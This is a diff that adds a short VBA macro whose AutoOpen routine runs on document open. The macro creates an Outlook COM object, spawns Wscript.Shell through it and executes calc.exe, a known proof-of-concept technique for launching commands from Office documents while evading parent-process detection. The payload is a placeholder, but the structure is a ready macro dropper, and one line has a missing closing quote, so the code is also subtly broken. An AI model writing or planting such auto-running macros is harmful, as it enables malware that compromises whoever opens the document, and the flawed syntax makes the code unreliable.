@@ -1,0 +1,7 @@
+Sub AutoOpen()
+Dim objOL as Object
+Set objOL = CreateObject("Outlook.Application")
+Set WshShell = objOL.CreateObject("Wscript.Shell)
+Set WshShellExec = WshShell.Exec("calc.exe")
+End Sub
+
